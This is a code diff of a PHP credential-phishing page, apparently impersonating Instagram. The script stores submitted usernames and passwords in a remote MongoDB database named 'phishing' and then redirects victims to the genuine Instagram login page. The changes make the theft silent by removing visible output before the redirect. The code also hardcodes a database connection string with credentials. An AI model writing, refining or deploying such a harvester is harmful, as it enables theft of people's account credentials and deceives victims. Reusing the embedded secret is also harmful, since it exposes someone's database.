@@ -1,5 +1,5 @@
 <?php
-require 'vendor/autoload.php'; // โหลด composer autoload
+require 'vendor/autoload.php';
 
 use MongoDB\Client;
 
@@ -9,23 +9,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if ($username && $password) {
         try {
-            // เชื่อมต่อ MongoDB (แก้ connection string เป็นของคุณ)
             $client = new Client("mongodb+srv://ig-login:C1gd6Iec6MX2LXUD@ig-login.fqd6tee.mongodb.net/");
-
             $collection = $client->phishing->credentials;
 
-            // บันทึกข้อมูลลง MongoDB
-            $insertResult = $collection->insertOne([
+            $collection->insertOne([
                 'username' => $username,
                 'password' => $password
             ]);
 
-            echo "บันทึกข้อมูลสำเร็จ! ID: " . $insertResult->getInsertedId();
-
+            // ไม่ echo อะไรออกไปก่อน header
             header("Location: https://www.instagram.com/accounts/login/");
             exit();
 
         } catch (Exception $e) {
+            // ยังไม่ใช้ header → แสดงข้อความได้
             echo "เกิดข้อผิดพลาด: " . $e->getMessage();
         }
     } else {
